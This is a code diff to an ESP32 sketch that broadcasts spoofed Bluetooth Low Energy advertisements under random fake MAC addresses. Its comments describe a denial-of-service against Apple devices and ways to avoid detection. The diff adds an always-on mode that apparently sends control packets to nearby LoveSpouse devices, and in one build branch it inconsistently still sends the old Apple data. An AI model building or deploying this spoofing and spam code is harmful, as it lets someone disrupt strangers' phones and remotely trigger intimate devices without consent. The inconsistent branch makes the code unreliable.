@@ -9,6 +9,7 @@
 #include <esp_arduino_version.h>
 
 #include "devices.hpp"
+#include "lovespouse.hpp"
 
 // Bluetooth maximum transmit power
 #if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
@@ -21,6 +22,7 @@
 
 BLEAdvertising *pAdvertising;  // global variable
 uint32_t delayMilliseconds = 1000;
+uint32_t fuseSeconds = 5;
 
 void setup() {
   Serial.begin(115200);
@@ -44,6 +46,13 @@ void setup() {
   // seems we need to init it with an address in setup() step.
   esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
   pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
+
+  for (int i = fuseSeconds; i > 0; i--) {
+    Serial.print("Fuse remaining time: ");
+    Serial.print(i);
+    Serial.println(" Second(s)");
+    delay(1000);
+  }
 }
 
 void loop() {
@@ -51,13 +60,15 @@ void loop() {
   digitalWrite(12, HIGH);
   digitalWrite(13, HIGH);
 
+  bool love_spouse_mode = true;
+
   // First generate fake random MAC
   esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
   for (int i = 0; i < 6; i++){
     dummy_addr[i] = random(256);
 
     // It seems for some reason first 4 bits
-    // Need to be high (aka 0b1111), so we 
+    // Need to be high (aka 0b1111), so we
     // OR with 0xF0
     if (i == 0){
       dummy_addr[i] |= 0xF0;
@@ -69,41 +80,55 @@ void loop() {
   // Randomly pick data from one of the devices
   // First decide short or long
   // 0 = long (headphones), 1 = short (misc stuff like Apple TV)
-  int device_choice = random(2);
-  if (device_choice == 0){
-    int index = random(17);
-    #ifdef ESP_ARDUINO_VERSION_MAJOR
-      #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
-          oAdvertisementData.addData(String((char*)DEVICES[index], 31));
-      #else
-          oAdvertisementData.addData(std::string((char*)DEVICES[index], 31));
-      #endif
-    #endif
-  } else {
-    int index = random(13);
+  if (love_spouse_mode) {
+    int index = random(3);
     #ifdef ESP_ARDUINO_VERSION_MAJOR
       #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
           oAdvertisementData.addData(String((char*)SHORT_DEVICES[index], 23));
       #else
-          oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[index], 23));
+          oAdvertisementData.addData(std::string((char*)make_lovespouse_packet(plays[index]), 22));
       #endif
     #endif
+  } else {
+    int device_choice = random(2);
+    if (device_choice == 0){
+      int index = random(17);
+      #ifdef ESP_ARDUINO_VERSION_MAJOR
+        #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
+            oAdvertisementData.addData(String((char*)DEVICES[index], 31));
+        #else
+            oAdvertisementData.addData(std::string((char*)DEVICES[index], 31));
+        #endif
+      #endif
+    } else {
+      int index = random(13);
+      #ifdef ESP_ARDUINO_VERSION_MAJOR
+        #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
+            oAdvertisementData.addData(String((char*)SHORT_DEVICES[index], 23));
+        #else
+            oAdvertisementData.addData(std::string((char*)SHORT_DEVICES[index], 23));
+        #endif
+      #endif
+    }
   }
 
 /*  Page 191 of Apple's "Accessory Design Guidelines for Apple Devices (Release R20)" recommends to use only one of
       the three advertising PDU types when you want to connect to Apple devices.
-          // 0 = ADV_TYPE_IND, 
+          // 0 = ADV_TYPE_IND,
           // 1 = ADV_TYPE_SCAN_IND
           // 2 = ADV_TYPE_NONCONN_IND
-      
-      Randomly using any of these PDU types may increase detectability of spoofed packets. 
+
+      Randomly using any of these PDU types may increase detectability of spoofed packets.
 
       What we know for sure:
       - AirPods Gen 2: this advertises ADV_TYPE_SCAN_IND packets when the lid is opened and ADV_TYPE_NONCONN_IND when in pairing mode (when the rear case btton is held).
                         Consider using only these PDU types if you want to target Airpods Gen 2 specifically.
   */
-  
+
   int adv_type_choice = random(3);
+  if (love_spouse_mode == true){
+    adv_type_choice = 0;
+  }
   if (adv_type_choice == 0){
     pAdvertising->setAdvertisementType(ADV_TYPE_IND);
   } else if (adv_type_choice == 1){
@@ -115,11 +140,11 @@ void loop() {
   // Set the device address, advertisement data
   pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
   pAdvertising->setAdvertisementData(oAdvertisementData);
-  
+
   // Set advertising interval
   /*  According to Apple' Technical Q&A QA1931 (https://developer.apple.com/library/archive/qa/qa1931/_index.html), Apple recommends
       an advertising interval of 20ms to developers who want to maximize the probability of their BLE accessories to be discovered by iOS.
-      
+
       These lines of code fixes the interval to 20ms. Enabling these MIGHT increase the effectiveness of the DoS. Note this has not undergone thorough testing.
   */
 
